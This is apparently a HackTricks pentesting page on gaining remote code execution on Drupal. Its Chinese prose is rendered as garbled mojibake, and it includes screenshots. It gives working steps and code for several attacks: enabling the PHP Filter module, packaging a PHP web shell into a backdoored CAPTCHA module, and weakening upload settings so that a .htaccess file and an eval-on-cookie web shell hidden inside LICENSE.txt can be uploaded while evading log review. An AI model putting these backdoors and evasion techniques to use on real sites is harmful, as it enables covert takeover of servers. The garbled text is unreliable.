# Drupal RCE

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ä½¿ç”¨ PHP è¿‡æ»¤å™¨æ¨¡å—

{% hint style="warning" %}
åœ¨æ—§ç‰ˆæœ¬çš„ Drupal **(8 ä¹‹å‰)**ï¼Œå¯ä»¥ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•å¹¶ **å¯ç”¨ `PHP filter` æ¨¡å—**ï¼Œè¯¥æ¨¡å—â€œå…è®¸åµŒå…¥çš„ PHP ä»£ç /ç‰‡æ®µè¢«è¯„ä¼°ã€‚â€ä½†ä»ç‰ˆæœ¬ 8 å¼€å§‹ï¼Œè¯¥æ¨¡å—é»˜è®¤ä¸å®‰è£…ã€‚
{% endhint %}

æ‚¨éœ€è¦ **å®‰è£… php æ’ä»¶**ï¼ˆé€šè¿‡è®¿é—® _/modules/php_ æ£€æŸ¥ï¼Œå¦‚æœè¿”å› **403**ï¼Œåˆ™ **å­˜åœ¨**ï¼Œå¦‚æœ **æœªæ‰¾åˆ°**ï¼Œåˆ™ **php æ’ä»¶æœªå®‰è£…**ï¼‰

è½¬åˆ° _Modules_ -> (**æ£€æŸ¥**) _PHP Filter_ -> _ä¿å­˜é…ç½®_

![](<../../../.gitbook/assets/image (247) (1).png>)

ç„¶åç‚¹å‡» _æ·»åŠ å†…å®¹_ -> é€‰æ‹© _åŸºæœ¬é¡µé¢_ æˆ– _æ–‡ç« _ -> åœ¨æ­£æ–‡ä¸­å†™å…¥ _php shellcode_ -> åœ¨ _æ–‡æœ¬æ ¼å¼_ ä¸­é€‰æ‹© _PHP ä»£ç _ -> é€‰æ‹© _é¢„è§ˆ_

![](<../../../.gitbook/assets/image (338).png>)

æœ€ååªéœ€è®¿é—®æ–°åˆ›å»ºçš„èŠ‚ç‚¹ï¼š
```bash
curl http://drupal-site.local/node/3
```
## å®‰è£… PHP Filter æ¨¡å—

{% hint style="warning" %}
åœ¨å½“å‰ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤å®‰è£…åä»…é€šè¿‡è®¿é—®ç½‘é¡µä¸å†å¯èƒ½å®‰è£…æ’ä»¶ã€‚
{% endhint %}

ä»ç‰ˆæœ¬ **8 å¼€å§‹ï¼Œ** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **æ¨¡å—ä¸å†é»˜è®¤å®‰è£…**ã€‚è¦åˆ©ç”¨æ­¤åŠŸèƒ½ï¼Œæˆ‘ä»¬å¿…é¡» **è‡ªå·±å®‰è£…æ¨¡å—**ã€‚

1. ä» Drupal ç½‘ç«™ä¸‹è½½æ¨¡å—çš„æœ€æ–°ç‰ˆæœ¬ã€‚
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. ä¸‹è½½å®Œæˆåï¼Œè½¬åˆ° **`Administration`** > **`Reports`** > **`Available updates`**ã€‚
3. ç‚¹å‡» **`Browse`**ï¼Œé€‰æ‹©æˆ‘ä»¬ä¸‹è½½çš„æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œç„¶åç‚¹å‡» **`Install`**ã€‚
4. æ¨¡å—å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥ç‚¹å‡» **`Content`** å¹¶ **åˆ›å»ºä¸€ä¸ªæ–°çš„åŸºæœ¬é¡µé¢**ï¼Œç±»ä¼¼äºæˆ‘ä»¬åœ¨ Drupal 7 ç¤ºä¾‹ä¸­æ‰€åšçš„ã€‚å†æ¬¡ç¡®ä¿ **ä» `Text format` ä¸‹æ‹‰èœå•ä¸­é€‰æ‹© `PHP code`**ã€‚

## åé—¨æ¨¡å—

{% hint style="warning" %}
åœ¨å½“å‰ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤å®‰è£…åä»…é€šè¿‡è®¿é—®ç½‘é¡µä¸å†å¯èƒ½å®‰è£…æ’ä»¶ã€‚
{% endhint %}

åé—¨æ¨¡å—å¯ä»¥é€šè¿‡ **å‘ç°æœ‰æ¨¡å—æ·»åŠ  shell** æ¥åˆ›å»ºã€‚æ¨¡å—å¯ä»¥åœ¨ drupal.org ç½‘ç«™ä¸Šæ‰¾åˆ°ã€‚æˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªæ¨¡å—ï¼Œä¾‹å¦‚ [CAPTCHA](https://www.drupal.org/project/captcha)ã€‚å‘ä¸‹æ»šåŠ¨å¹¶å¤åˆ¶ tar.gz [å½’æ¡£](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) çš„é“¾æ¥ã€‚

* ä¸‹è½½å½’æ¡£å¹¶æå–å…¶å†…å®¹ã€‚
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* åˆ›å»ºä¸€ä¸ª **PHP web shell**ï¼Œå†…å®¹ä¸ºï¼š
```php
<?php
system($_GET["cmd"]);
?>
```
* æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª **`.htaccess`** æ–‡ä»¶ï¼Œä»¥ä¾¿ä¸ºè‡ªå·±æä¾›å¯¹è¯¥æ–‡ä»¶å¤¹çš„è®¿é—®æƒé™ã€‚è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸º Drupal æ‹’ç»ç›´æ¥è®¿é—® **`/modules`** æ–‡ä»¶å¤¹ã€‚
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* ä¸Šè¿°é…ç½®å°†åœ¨æˆ‘ä»¬è¯·æ±‚ /modules ä¸­çš„æ–‡ä»¶æ—¶åº”ç”¨è§„åˆ™ã€‚å°†è¿™ä¸¤ä¸ªæ–‡ä»¶å¤åˆ¶åˆ° captcha æ–‡ä»¶å¤¹å¹¶åˆ›å»ºä¸€ä¸ªå½’æ¡£ã€‚
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* å‡è®¾æˆ‘ä»¬å¯¹ç½‘ç«™æœ‰**ç®¡ç†è®¿é—®æƒé™**ï¼Œç‚¹å‡»ä¾§è¾¹æ çš„**`ç®¡ç†`**ï¼Œç„¶åç‚¹å‡»**`æ‰©å±•`**ã€‚æ¥ä¸‹æ¥ï¼Œç‚¹å‡»**`+ å®‰è£…æ–°æ¨¡å—`**æŒ‰é’®ï¼Œæˆ‘ä»¬å°†è¢«å¸¦åˆ°å®‰è£…é¡µé¢ï¼Œä¾‹å¦‚`http://drupal-site.local/admin/modules/install`ã€‚æµè§ˆåˆ°åé—¨åŒ–çš„éªŒè¯ç å½’æ¡£å¹¶ç‚¹å‡»**`å®‰è£…`**ã€‚
* å®‰è£…æˆåŠŸåï¼Œæµè§ˆåˆ°**`/modules/captcha/shell.php`**ä»¥æ‰§è¡Œå‘½ä»¤ã€‚

## ä½¿ç”¨é…ç½®åŒæ­¥å¯¹Drupalè¿›è¡Œåé—¨åŒ– <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**åˆ†äº«è€…** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### ç¬¬1éƒ¨åˆ†ï¼ˆæ¿€æ´»_åª’ä½“_å’Œ_åª’ä½“åº“_ï¼‰

åœ¨_æ‰©å±•_èœå•ï¼ˆ/admin/modulesï¼‰ä¸­ï¼Œæ‚¨å¯ä»¥æ¿€æ´»çœ‹ä¼¼å·²ç»å®‰è£…çš„æ’ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ’ä»¶_åª’ä½“_å’Œ_åª’ä½“åº“_ä¼¼ä¹æœªè¢«æ¿€æ´»ï¼Œå› æ­¤è®©æˆ‘ä»¬æ¿€æ´»å®ƒä»¬ã€‚

æ¿€æ´»å‰ï¼š

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

æ¿€æ´»åï¼š

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### ç¬¬2éƒ¨åˆ†ï¼ˆåˆ©ç”¨_é…ç½®åŒæ­¥_åŠŸèƒ½ï¼‰ <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

æˆ‘ä»¬å°†åˆ©ç”¨_é…ç½®åŒæ­¥_åŠŸèƒ½æ¥è½¬å‚¨ï¼ˆå¯¼å‡ºï¼‰å’Œä¸Šä¼ ï¼ˆå¯¼å…¥ï¼‰Drupalé…ç½®æ¡ç›®ï¼š

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**è¡¥ä¸ system.file.yml**

è®©æˆ‘ä»¬ä»è¡¥ä¸ç¬¬ä¸€ä¸ªæ¡ç›®`allow_insecure_uploads`å¼€å§‹ï¼š

æ–‡ä»¶ï¼šsystem.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

åˆ°ï¼š

æ–‡ä»¶ï¼šsystem.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**ä¿®è¡¥ field.field.media.document.field\_media\_document.yml**

ç„¶åï¼Œä¿®è¡¥ç¬¬äºŒä¸ªæ¡ç›® `file_extensions` ä»ï¼š 

æ–‡ä»¶ï¼š field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

åˆ°ï¼š

æ–‡ä»¶ï¼šfield.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> æˆ‘åœ¨è¿™ç¯‡åšå®¢ä¸­æ²¡æœ‰ä½¿ç”¨å®ƒï¼Œä½†å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¯ä»¥ä»¥ä»»æ„æ–¹å¼å®šä¹‰æ¡ç›® `file_directory`ï¼Œå¹¶ä¸”å®ƒå®¹æ˜“å—åˆ°è·¯å¾„éå†æ”»å‡»ï¼ˆå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨Drupalæ–‡ä»¶ç³»ç»Ÿæ ‘ä¸­å‘ä¸Šè¿”å›ï¼‰ã€‚

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### ç¬¬3éƒ¨åˆ†ï¼ˆåˆ©ç”¨åŠŸèƒ½ _æ·»åŠ æ–‡æ¡£_ï¼‰ <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

æœ€åä¸€æ­¥æ˜¯æœ€ç®€å•çš„ï¼Œåˆ†ä¸ºä¸¤ä¸ªå­æ­¥éª¤ã€‚ç¬¬ä¸€ä¸ªæ˜¯ä¸Šä¼ ä¸€ä¸ª.htaccessæ ¼å¼çš„æ–‡ä»¶ï¼Œä»¥åˆ©ç”¨ApacheæŒ‡ä»¤å¹¶å…è®¸PHPå¼•æ“è§£é‡Š.txtæ–‡ä»¶ã€‚ç¬¬äºŒä¸ªæ˜¯ä¸Šä¼ ä¸€ä¸ªåŒ…å«æˆ‘ä»¬æœ‰æ•ˆè½½è·çš„.txtæ–‡ä»¶ã€‚

æ–‡ä»¶ï¼š.htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
ä¸ºä»€ä¹ˆè¿™ä¸ªæŠ€å·§å¾ˆé…·ï¼Ÿ

å› ä¸ºä¸€æ—¦ Webshellï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º LICENSE.txtï¼‰è¢«æ”¾ç½®åˆ° Web æœåŠ¡å™¨ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ `$_COOKIE` ä¼ è¾“æˆ‘ä»¬çš„å‘½ä»¤ï¼Œå¹¶ä¸”åœ¨ Web æœåŠ¡å™¨æ—¥å¿—ä¸­ï¼Œè¿™å°†æ˜¾ç¤ºä¸ºå¯¹æ–‡æœ¬æ–‡ä»¶çš„åˆæ³• GET è¯·æ±‚ã€‚

ä¸ºä»€ä¹ˆå°†æˆ‘ä»¬çš„ Webshell å‘½åä¸º LICENSE.txtï¼Ÿ

ç®€å•æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬ä»¥ä»¥ä¸‹æ–‡ä»¶ä¸ºä¾‹ [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt)ï¼ˆè¯¥æ–‡ä»¶å·²ç»å­˜åœ¨äº Drupal æ ¸å¿ƒä¸­ï¼‰ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ª339è¡Œå’Œ17.6 KBå¤§å°çš„æ–‡ä»¶ï¼Œè¿™éå¸¸é€‚åˆåœ¨ä¸­é—´æ·»åŠ ä¸€å°æ®µ PHP ä»£ç ï¼ˆå› ä¸ºæ–‡ä»¶è¶³å¤Ÿå¤§ï¼‰ã€‚

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

æ–‡ä»¶ï¼šå·²ä¿®è¡¥çš„ LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **ç¬¬3.1éƒ¨åˆ†ï¼ˆä¸Šä¼ æ–‡ä»¶ .htaccessï¼‰**

é¦–å…ˆï¼Œæˆ‘ä»¬åˆ©ç”¨ _Add Document_ (/media/add/document) åŠŸèƒ½ä¸Šä¼ åŒ…å«ApacheæŒ‡ä»¤çš„æ–‡ä»¶ï¼ˆ.htaccessï¼‰ã€‚

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**ç¬¬3.2éƒ¨åˆ†ï¼ˆä¸Šä¼ æ–‡ä»¶ LICENSE.txtï¼‰**

ç„¶åï¼Œæˆ‘ä»¬å†æ¬¡åˆ©ç”¨ _Add Document_ (/media/add/document) åŠŸèƒ½ä¸Šä¼ éšè—åœ¨è®¸å¯è¯æ–‡ä»¶ä¸­çš„Webshellã€‚

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### ç¬¬4éƒ¨åˆ†ï¼ˆä¸Webshelläº¤äº’ï¼‰ <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

æœ€åä¸€éƒ¨åˆ†æ˜¯ä¸Webshellè¿›è¡Œäº¤äº’ã€‚

å¦‚ä»¥ä¸‹æˆªå›¾æ‰€ç¤ºï¼Œå¦‚æœæˆ‘ä»¬çš„Webshellæ‰€æœŸæœ›çš„cookieæœªå®šä¹‰ï¼Œåˆ™åœ¨é€šè¿‡Webæµè§ˆå™¨æŸ¥è¯¢æ–‡ä»¶æ—¶ä¼šå¾—åˆ°åç»­ç»“æœã€‚

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

å½“æ”»å‡»è€…è®¾ç½®cookieæ—¶ï¼Œä»–å¯ä»¥ä¸Webshelläº¤äº’å¹¶æ‰§è¡Œä»»ä½•ä»–æƒ³è¦çš„å‘½ä»¤ã€‚

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

æ­£å¦‚æ‚¨åœ¨æ—¥å¿—ä¸­çœ‹åˆ°çš„ï¼Œä¼¼ä¹åªè¯·æ±‚äº†ä¸€ä¸ªtxtæ–‡ä»¶ã€‚

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

æ„Ÿè°¢æ‚¨èŠ±æ—¶é—´é˜…è¯»æœ¬æ–‡ï¼Œå¸Œæœ›å®ƒèƒ½å¸®åŠ©æ‚¨è·å–ä¸€äº›shellã€‚

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
